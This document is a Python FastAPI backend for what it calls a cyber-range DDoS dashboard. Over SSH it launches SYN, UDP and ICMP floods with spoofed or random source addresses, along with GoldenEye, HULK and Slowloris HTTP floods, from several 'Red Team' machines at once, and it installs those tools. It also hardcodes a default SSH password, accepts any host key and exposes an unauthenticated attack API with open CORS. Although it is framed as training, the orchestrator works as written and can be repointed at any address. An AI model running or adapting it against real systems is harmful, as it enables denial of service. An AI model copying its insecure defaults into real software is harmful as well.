"""
DDoS Visualization Dashboard - Standalone Backend API
Completely separate from Cyber Range backend
Executes real DDoS attacks via SSH to Red Team VMs
"""

import asyncio
from concurrent.futures import ThreadPoolExecutor
import json
import logging
import os
import uuid
import ipaddress
import random
from datetime import datetime
from typing import Any, Dict, List, Optional
from dataclasses import dataclass, asdict, field

import paramiko
from dotenv import load_dotenv
from fastapi import FastAPI, WebSocket, WebSocketDisconnect, HTTPException, BackgroundTasks
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
import uvicorn

# Load environment variables
load_dotenv()

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Thread pool for SSH operations (blocking I/O)
ssh_executor = ThreadPoolExecutor(max_workers=10)

# ============================================================================
# Configuration
# ============================================================================

SSH_USERNAME = os.getenv('SSH_USERNAME', 'mist')
SSH_PASSWORD = os.getenv('SSH_PASSWORD', 'Cyber#Range')
SSH_PORT = int(os.getenv('SSH_PORT', '22'))
SSH_KEY_PATH = os.getenv('SSH_KEY_PATH', '')

API_HOST = os.getenv('API_HOST', '0.0.0.0')
API_PORT = int(os.getenv('API_PORT', '8841'))

# Red Team VMs Configuration
RED_TEAM_VMS = {
    "scheduler": {"ip": "10.10.30.30", "name": "Attack Scheduler", "role": "Coordination"},
        "generator": {"ip": "10.10.30.50", "name": "Attack Generator", "role": "Primary Attacker"},
        "gui": {"ip": "10.10.30.40", "name": "Red Team GUI", "role": "C2 Interface"},
    "botnet1": {"ip": "10.72.200.64", "name": "Botnet Generator 1", "role": "Distributed Attack"},
    "botnet2": {"ip": "10.72.200.65", "name": "Botnet Generator 2", "role": "Distributed Attack"},
}

# Blue Team Targets Configuration
BLUE_TEAM_TARGETS = {
    "team1": {"ip": "20.10.40.11", "name": "Blue Team 1", "ports": [9080, 9090, 3000]},
    "team2": {"ip": "20.10.50.13", "name": "Blue Team 2", "ports": [9080, 9090, 3000]},
    "team3": {"ip": "20.10.60.11", "name": "Blue Team 3", "ports": [9080, 9090, 3000]},
}

# Attack Tools Configuration
ATTACK_TOOLS = {
    "syn_flood": {
        "name": "SYN Flood",
        "command": "sudo timeout {duration} hping3 -S -p {port} --flood --rand-source {target}",
        "requires_sudo": True,
    },
    "udp_flood": {
        "name": "UDP Flood",
        "command": "sudo timeout {duration} hping3 --udp -p {port} --flood --rand-source {target}",
        "requires_sudo": True,
    },
    "http_flood": {
        "name": "HTTP Flood (GoldenEye)",
        "command": "cd /opt/GoldenEye && timeout {duration} python3 goldeneye.py http://{target}:{port} -w {workers} -s {sockets}",
        "requires_sudo": False,
    },
    "slowloris": {
        "name": "Slowloris",
        "command": "timeout {duration} slowloris -s {sockets} -p {port} {target}",
        "requires_sudo": False,
    },
    "icmp_flood": {
        "name": "ICMP Flood",
        "command": "sudo timeout {duration} hping3 --icmp --flood {target}",
        "requires_sudo": True,
    },
    "hulk": {
        "name": "HULK HTTP Flood",
        "command": "cd /opt/hulk && timeout {duration} python3 hulk.py http://{target}:{port}",
        "requires_sudo": False,
    },
}

# ============================================================================
# Data Models
# ============================================================================

@dataclass
class AttackExecution:
    attack_id: str
    attack_type: str
    source_vms: List[str]
    target_ip: str
    target_port: int
    duration: int
    status: str  # queued, running, completed, failed, stopped
    start_time: str
    end_time: Optional[str] = None
    workers: int = 50
    sockets: int = 100
    enable_ip_spoofing: bool = False
    spoofed_ips: Optional[List[str]] = None
    logs: List[str] = field(default_factory=list)
    results: Dict[str, Any] = field(default_factory=dict)
    packets_sent: int = 0
    bytes_sent: int = 0


class AttackRequest(BaseModel):
    attack_type: str
    source_vms: List[str]
    target_id: str
    target_port: int = 9080
    duration: int = 120
    workers: int = 50
    sockets: int = 100
    enable_ip_spoofing: bool = False
    spoofed_ips: Optional[List[str]] = None


class IPSpoofingRequest(BaseModel):
    ip_range: Optional[str] = None  # CIDR notation, e.g., "192.168.1.0/24"
    count: int = 10  # Number of IPs to generate
    starting_ip: Optional[str] = None  # Starting IP for sequential generation
    use_sequential: bool = False  # If True, generate sequential IPs from starting_ip


class IPSpoofingResponse(BaseModel):
    spoofed_ips: List[str]
    count: int


class AttackResponse(BaseModel):
    attack_id: str
    status: str
    message: str


# ============================================================================
# SSH Executor
# ============================================================================

class SSHExecutor:
    """Execute commands on remote VMs via SSH"""

    @staticmethod
    def get_connection(hostname: str) -> paramiko.SSHClient:
        """Create SSH connection to a VM"""
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        connect_kwargs = {
            "hostname": hostname,
            "port": SSH_PORT,
            "username": SSH_USERNAME,
            "timeout": 30,
        }

        if SSH_KEY_PATH and os.path.exists(SSH_KEY_PATH):
            connect_kwargs["key_filename"] = SSH_KEY_PATH
        else:
            connect_kwargs["password"] = SSH_PASSWORD

        ssh.connect(**connect_kwargs)
        return ssh

    @staticmethod
    def execute_command(hostname: str, command: str, timeout: int = 300) -> Dict[str, Any]:
        """Execute command on remote VM"""
        try:
            ssh = SSHExecutor.get_connection(hostname)
            logger.info(f"⚡ Executing on {hostname}: {command[:100]}...")

            stdin, stdout, stderr = ssh.exec_command(command, timeout=timeout)

            stdout_data = stdout.read().decode('utf-8')
            stderr_data = stderr.read().decode('utf-8')
            exit_code = stdout.channel.recv_exit_status()

            ssh.close()

            return {
                "success": exit_code == 0 or exit_code == 124,  # 124 = timeout (expected)
                "exit_code": exit_code,
                "stdout": stdout_data,
                "stderr": stderr_data,
                "hostname": hostname
            }
        except Exception as e:
            logger.error(f"❌ SSH execution failed on {hostname}: {str(e)}")
            return {
                "success": False,
                "exit_code": -1,
                "stdout": "",
                "stderr": str(e),
                "hostname": hostname
            }

    @staticmethod
    def check_connectivity(hostname: str) -> Dict[str, Any]:
        """Check if VM is reachable via SSH"""
        try:
            ssh = SSHExecutor.get_connection(hostname)
            stdin, stdout, stderr = ssh.exec_command("echo 'connected' && hostname", timeout=10)
            output = stdout.read().decode('utf-8').strip()
            ssh.close()
            return {"success": True, "status": "online", "output": output}
        except Exception as e:
            return {"success": False, "status": "offline", "error": str(e)}


# ============================================================================
# IP Spoofing Utilities
# ============================================================================

class IPSpoofingUtil:
    """Utilities for IP spoofing and random IP generation"""

    @staticmethod
    def generate_random_ips(ip_range: str, count: int = 10) -> List[str]:
        """
        Generate random IP addresses from a given CIDR range
        Args:
            ip_range: CIDR notation (e.g., "192.168.1.0/24")
            count: Number of random IPs to generate
        Returns:
            List of random IP addresses
        """
        try:
            network = ipaddress.ip_network(ip_range, strict=False)
            # Get all hosts in the network
            all_hosts = list(network.hosts())

            if not all_hosts:
                # For /32 or single IP, use the network address
                all_hosts = [network.network_address]

            # Generate random IPs
            num_ips = min(count, len(all_hosts))
            random_ips = random.sample(all_hosts, num_ips)

            return [str(ip) for ip in random_ips]
        except ValueError as e:
            logger.error(f"Invalid IP range: {ip_range} - {e}")
            raise HTTPException(status_code=400, detail=f"Invalid IP range: {str(e)}")

    @staticmethod
    def generate_sequential_ips(starting_ip: str, count: int = 10) -> List[str]:
        """
        Generate sequential IP addresses from a starting IP
        Args:
            starting_ip: Starting IP address (e.g., "192.168.1.10")
            count: Number of sequential IPs to generate
        Returns:
            List of sequential IP addresses
        """
        try:
            start_addr = ipaddress.ip_address(starting_ip)
            sequential_ips = []

            for i in range(count):
                try:
                    next_ip = start_addr + i
                    sequential_ips.append(str(next_ip))
                except ipaddress.AddressValueError:
                    # Stop if we reach the maximum IP address
                    logger.warning(f"Reached maximum IP address at {next_ip}")
                    break

            return sequential_ips
        except ValueError as e:
            logger.error(f"Invalid starting IP: {starting_ip} - {e}")
            raise HTTPException(status_code=400, detail=f"Invalid starting IP: {str(e)}")

    @staticmethod
    def get_common_ip_ranges() -> List[Dict[str, str]]:
        """Get list of common IP ranges for spoofing"""
        return [
            {"name": "Private Class A", "range": "10.0.0.0/8"},
            {"name": "Private Class B", "range": "172.16.0.0/12"},
            {"name": "Private Class C", "range": "192.168.0.0/16"},
            {"name": "Small Subnet (/24)", "range": "192.168.1.0/24"},
            {"name": "Medium Subnet (/20)", "range": "10.0.0.0/20"},
            {"name": "Large Subnet (/16)", "range": "172.16.0.0/16"},
            {"name": "Custom Range", "range": "203.0.113.0/24"},  # TEST-NET-3
        ]

    @staticmethod
    def modify_attack_command_for_spoofing(command: str, spoofed_ips: List[str]) -> str:
        """
        Modify attack command to use IP spoofing
        For hping3 commands, use -a flag for source IP spoofing
        """
        if not spoofed_ips:
            return command

        # For hping3-based attacks (SYN, UDP, ICMP floods)
        if "hping3" in command:
            # Remove --rand-source if present and add -a flag with random IP
            command = command.replace("--rand-source", "")
            random_ip = random.choice(spoofed_ips)
            # Add -a flag before the target
            parts = command.split()
            # Find where to insert -a flag (before target which is usually last)
            if len(parts) > 1:
                parts.insert(-1, f"-a {random_ip}")
            command = " ".join(parts)

        return command


# ============================================================================
# Attack Orchestrator
# ============================================================================

class AttackOrchestrator:
    """Orchestrate DDoS attacks across multiple VMs"""

    def __init__(self):
        self.active_attacks: Dict[str, AttackExecution] = {}
        self.websocket_connections: Dict[str, List[WebSocket]] = {}

    async def broadcast_to_attack(self, attack_id: str, message: Dict[str, Any]):
        """Send message to all WebSocket connections for an attack"""
        if attack_id in self.websocket_connections:
            dead_connections = []
            for ws in self.websocket_connections[attack_id]:
                try:
                    await ws.send_json(message)
                except Exception as e:
                    logger.error(f"WebSocket send error: {e}")
                    dead_connections.append(ws)
            # Remove dead connections
            for ws in dead_connections:
                self.websocket_connections[attack_id].remove(ws)

    async def execute_attack(self, attack_id: str, attack_type: str, source_vm_ip: str,
                            target_ip: str, target_port: int, duration: int,
                            workers: int = 50, sockets: int = 100,
                            enable_ip_spoofing: bool = False,
                            spoofed_ips: Optional[List[str]] = None) -> Dict[str, Any]:
        """Execute a single attack from one VM"""

        if attack_type not in ATTACK_TOOLS:
            return {"success": False, "error": f"Unknown attack type: {attack_type}"}

        tool = ATTACK_TOOLS[attack_type]
        command = tool["command"].format(
            target=target_ip,
            port=target_port,
            duration=duration,
            workers=workers,
            sockets=sockets
        )

        # Apply IP spoofing if enabled
        if enable_ip_spoofing and spoofed_ips:
            command = IPSpoofingUtil.modify_attack_command_for_spoofing(command, spoofed_ips)
            logger.info(f"🎭 IP Spoofing enabled with {len(spoofed_ips)} addresses")
            await self.broadcast_to_attack(attack_id, {
                "type": "log",
                "source": source_vm_ip,
                "message": f"🎭 IP Spoofing enabled: {len(spoofed_ips)} spoofed addresses"
            })

        # Add logging
        log_file = f"/tmp/ddos_{attack_type}_{attack_id[:8]}.log"
        command = f"{command} 2>&1 | tee {log_file}"

        logger.info(f"🚀 Launching {tool['name']}: {source_vm_ip} → {target_ip}:{target_port}")

        # Send starting message
        await self.broadcast_to_attack(attack_id, {
            "type": "log",
            "source": source_vm_ip,
            "message": f"🚀 Starting {tool['name']} attack...",
            "timestamp": datetime.now().isoformat()
        })

        # Execute the attack in thread pool (non-blocking)
        loop = asyncio.get_event_loop()
        result = await loop.run_in_executor(
            ssh_executor,
            SSHExecutor.execute_command,
            source_vm_ip,
            command,
            duration + 60
        )

        # Send completion message
        status = "✅ completed" if result["success"] else "❌ failed"
        await self.broadcast_to_attack(attack_id, {
            "type": "log",
            "source": source_vm_ip,
            "message": f"{status}: {tool['name']} attack finished (exit code: {result['exit_code']})",
            "timestamp": datetime.now().isoformat(),
            "stdout": result["stdout"][-2000:] if result["stdout"] else "",  # Last 2000 chars
            "stderr": result["stderr"][-1000:] if result["stderr"] else ""
        })

        return result

    async def run_distributed_attack(self, request: AttackRequest) -> str:
        """Run a distributed attack from multiple VMs"""

        attack_id = str(uuid.uuid4())
        target_ip = BLUE_TEAM_TARGETS.get(request.target_id, {}).get("ip")

        if not target_ip:
            raise HTTPException(status_code=400, detail=f"Unknown target: {request.target_id}")

        # Validate source VMs
        source_ips = []
        for vm_id in request.source_vms:
            if vm_id in RED_TEAM_VMS:
                source_ips.append(RED_TEAM_VMS[vm_id]["ip"])
            else:
                raise HTTPException(status_code=400, detail=f"Unknown source VM: {vm_id}")

        # Create attack execution record
        attack = AttackExecution(
            attack_id=attack_id,
            attack_type=request.attack_type,
            source_vms=request.source_vms,
            target_ip=target_ip,
            target_port=request.target_port,
            duration=request.duration,
            status="running",
            start_time=datetime.now().isoformat(),
            workers=request.workers,
            sockets=request.sockets,
            enable_ip_spoofing=request.enable_ip_spoofing,
            spoofed_ips=request.spoofed_ips,
        )

        self.active_attacks[attack_id] = attack

        # Start attacks from all source VMs concurrently
        async def run_all_attacks():
            tasks = []
            for source_ip in source_ips:
                task = self.execute_attack(
                    attack_id=attack_id,
                    attack_type=request.attack_type,
                    source_vm_ip=source_ip,
                    target_ip=target_ip,
                    target_port=request.target_port,
                    duration=request.duration,
                    workers=request.workers,
                    sockets=request.sockets,
                    enable_ip_spoofing=request.enable_ip_spoofing,
                    spoofed_ips=request.spoofed_ips
                )
                tasks.append(task)

            results = await asyncio.gather(*tasks, return_exceptions=True)

            # Update attack status
            attack.status = "completed"
            attack.end_time = datetime.now().isoformat()
            attack.results = {
                "vm_results": [
                    r if isinstance(r, dict) else {"error": str(r)}
                    for r in results
                ]
            }

            # Broadcast completion
            await self.broadcast_to_attack(attack_id, {
                "type": "complete",
                "attack_id": attack_id,
                "status": "completed",
                "message": f"Attack completed from {len(source_ips)} source(s)",
                "timestamp": datetime.now().isoformat()
            })

        # Run in background
        asyncio.create_task(run_all_attacks())

        return attack_id

    async def stop_attack(self, attack_id: str) -> bool:
        """Stop a running attack"""
        if attack_id not in self.active_attacks:
            return False

        attack = self.active_attacks[attack_id]

        # Kill attack processes on all source VMs
        for vm_id in attack.source_vms:
            if vm_id in RED_TEAM_VMS:
                vm_ip = RED_TEAM_VMS[vm_id]["ip"]
                try:
                    # Kill common attack tools
                    kill_commands = [
                        "sudo pkill -9 hping3",
                        "sudo pkill -f goldeneye",
                        "sudo pkill -f slowloris",
                        "sudo pkill -f hulk"
                    ]
                    for cmd in kill_commands:
                        SSHExecutor.execute_command(vm_ip, cmd, timeout=10)
                except Exception as e:
                    logger.error(f"Error stopping attack on {vm_ip}: {e}")

        attack.status = "stopped"
        attack.end_time = datetime.now().isoformat()

        await self.broadcast_to_attack(attack_id, {
            "type": "stopped",
            "attack_id": attack_id,
            "message": "Attack stopped by user",
            "timestamp": datetime.now().isoformat()
        })

        return True


# ============================================================================
# FastAPI Application
# ============================================================================

app = FastAPI(
    title="DDoS Visualization Dashboard API",
    description="Standalone API for executing and monitoring DDoS attacks",
    version="1.0.0"
)

# CORS configuration
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],  # Configure appropriately for production
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Global orchestrator instance
orchestrator = AttackOrchestrator()


# ============================================================================
# API Endpoints
# ============================================================================

@app.get("/")
async def root():
    return {
        "service": "DDoS Visualization Dashboard API",
        "version": "1.0.0",
        "status": "running"
    }


@app.get("/api/health")
async def health_check():
    return {"status": "healthy", "timestamp": datetime.now().isoformat()}


@app.get("/api/vms/red-team")
async def get_red_team_vms():
    """Get all Red Team VMs with their status"""
    vms = []
    for vm_id, vm_info in RED_TEAM_VMS.items():
        status = SSHExecutor.check_connectivity(vm_info["ip"])
        vms.append({
            "id": vm_id,
            "name": vm_info["name"],
            "ip": vm_info["ip"],
            "role": vm_info["role"],
            "status": status["status"]
        })
    return {"vms": vms}


@app.get("/api/vms/blue-team")
async def get_blue_team_targets():
    """Get all Blue Team target VMs"""
    targets = []
    for target_id, target_info in BLUE_TEAM_TARGETS.items():
        targets.append({
            "id": target_id,
            "name": target_info["name"],
            "ip": target_info["ip"],
            "ports": target_info["ports"]
        })
    return {"targets": targets}


@app.get("/api/attack-types")
async def get_attack_types():
    """Get available attack types"""
    types = []
    for attack_id, attack_info in ATTACK_TOOLS.items():
        types.append({
            "id": attack_id,
            "name": attack_info["name"],
            "requires_sudo": attack_info["requires_sudo"]
        })
    return {"attack_types": types}


@app.post("/api/spoofing/generate", response_model=IPSpoofingResponse)
async def generate_spoofed_ips(request: IPSpoofingRequest):
    """
    Generate IP addresses for spoofing - either random from CIDR range or sequential from starting IP
    """
    try:
        if request.use_sequential:
            # Generate sequential IPs from starting IP
            if not request.starting_ip:
                raise HTTPException(status_code=400, detail="starting_ip is required for sequential generation")
            ips = IPSpoofingUtil.generate_sequential_ips(request.starting_ip, request.count)
        else:
            # Generate random IPs from CIDR range
            if not request.ip_range:
                raise HTTPException(status_code=400, detail="ip_range is required for random generation")
            ips = IPSpoofingUtil.generate_random_ips(request.ip_range, request.count)

        return IPSpoofingResponse(spoofed_ips=ips, count=len(ips))
    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))


@app.get("/api/spoofing/ranges")
async def get_common_ip_ranges():
    """
    Get list of common IP ranges for spoofing
    """
    return {"ranges": IPSpoofingUtil.get_common_ip_ranges()}


@app.post("/api/attacks/execute", response_model=AttackResponse)
async def execute_attack(request: AttackRequest, background_tasks: BackgroundTasks):
    """Execute a DDoS attack"""
    try:
        attack_id = await orchestrator.run_distributed_attack(request)
        return AttackResponse(
            attack_id=attack_id,
            status="running",
            message=f"Attack started from {len(request.source_vms)} VM(s)"
        )
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Attack execution failed: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@app.post("/api/attacks/{attack_id}/stop")
async def stop_attack(attack_id: str):
    """Stop a running attack"""
    success = await orchestrator.stop_attack(attack_id)
    if success:
        return {"status": "stopped", "attack_id": attack_id}
    else:
        raise HTTPException(status_code=404, detail="Attack not found")


@app.get("/api/attacks")
async def get_active_attacks():
    """Get all active attacks"""
    attacks = []
    for attack_id, attack in orchestrator.active_attacks.items():
        attacks.append(asdict(attack))
    return {"attacks": attacks}


@app.get("/api/attacks/{attack_id}")
async def get_attack_status(attack_id: str):
    """Get status of a specific attack"""
    if attack_id not in orchestrator.active_attacks:
        raise HTTPException(status_code=404, detail="Attack not found")
    return asdict(orchestrator.active_attacks[attack_id])


@app.websocket("/api/attacks/{attack_id}/ws")
async def attack_websocket(websocket: WebSocket, attack_id: str):
    """WebSocket for real-time attack updates"""
    try:
        await websocket.accept()
        logger.info(f"WebSocket connected for attack: {attack_id}")

        # Register connection
        if attack_id not in orchestrator.websocket_connections:
            orchestrator.websocket_connections[attack_id] = []
        orchestrator.websocket_connections[attack_id].append(websocket)

        # Send connected message
        await websocket.send_json({
            "type": "connected",
            "attack_id": attack_id,
            "message": "WebSocket connected successfully",
            "timestamp": datetime.now().isoformat()
        })

        # Send initial status if attack exists
        if attack_id in orchestrator.active_attacks:
            await websocket.send_json({
                "type": "status",
                "attack": asdict(orchestrator.active_attacks[attack_id])
            })

        # Keep connection alive
        while True:
            try:
                data = await asyncio.wait_for(websocket.receive_text(), timeout=30)
                # Handle ping/pong
                if data == "ping":
                    await websocket.send_text("pong")
            except asyncio.TimeoutError:
                # Send heartbeat
                try:
                    await websocket.send_json({"type": "heartbeat", "timestamp": datetime.now().isoformat()})
                except Exception:
                    break  # Connection lost

    except WebSocketDisconnect:
        logger.info(f"WebSocket disconnected for attack: {attack_id}")
    except Exception as e:
        logger.error(f"WebSocket error for attack {attack_id}: {e}")
    finally:
        # Unregister connection
        if attack_id in orchestrator.websocket_connections:
            orchestrator.websocket_connections[attack_id].remove(websocket)


@app.post("/api/tools/install/{vm_id}")
async def install_tools_on_vm(vm_id: str):
    """Install DDoS tools on a Red Team VM"""
    if vm_id not in RED_TEAM_VMS:
        raise HTTPException(status_code=404, detail=f"Unknown VM: {vm_id}")

    vm_ip = RED_TEAM_VMS[vm_id]["ip"]

    install_script = '''
    sudo apt-get update -y
    sudo apt-get install -y hping3 python3-pip git
    pip3 install slowloris requests

    cd /opt
    if [ ! -d "GoldenEye" ]; then
        sudo git clone https://github.com/jseidl/GoldenEye.git
        sudo chmod +x GoldenEye/goldeneye.py
    fi

    if [ ! -d "hulk" ]; then
        sudo git clone https://github.com/grafov/hulk.git
        sudo chmod +x hulk/hulk.py 2>/dev/null || true
    fi

    echo "✅ Tools installation complete"
    '''

    result = SSHExecutor.execute_command(vm_ip, install_script, timeout=600)
    return {
        "vm_id": vm_id,
        "success": result["success"],
        "output": result["stdout"],
        "error": result["stderr"] if not result["success"] else None
    }


@app.get("/api/vm/{vm_id}/check")
async def check_vm_connectivity(vm_id: str):
    """Check connectivity to a specific VM"""
    if vm_id in RED_TEAM_VMS:
        vm_ip = RED_TEAM_VMS[vm_id]["ip"]
    elif vm_id in BLUE_TEAM_TARGETS:
        vm_ip = BLUE_TEAM_TARGETS[vm_id]["ip"]
    else:
        raise HTTPException(status_code=404, detail=f"Unknown VM: {vm_id}")

    result = SSHExecutor.check_connectivity(vm_ip)
    return {"vm_id": vm_id, "ip": vm_ip, **result}


# ============================================================================
# Main Entry Point
# ============================================================================

if __name__ == "__main__":
    print(f"""
    ╔═══════════════════════════════════════════════════════════════╗
    ║       DDoS Visualization Dashboard - Backend API              ║
    ║                   Standalone Server                           ║
    ╠═══════════════════════════════════════════════════════════════╣
    ║  API URL:     http://{API_HOST}:{API_PORT}                        ║
    ║  Docs:        http://{API_HOST}:{API_PORT}/docs                   ║
    ║  WebSocket:   ws://{API_HOST}:{API_PORT}/api/attacks/{{id}}/ws      ║
    ╚═══════════════════════════════════════════════════════════════╝
    """)

    uvicorn.run(
        "main:app",
        host=API_HOST,
        port=API_PORT,
        reload=True,
        log_level="info"
    )
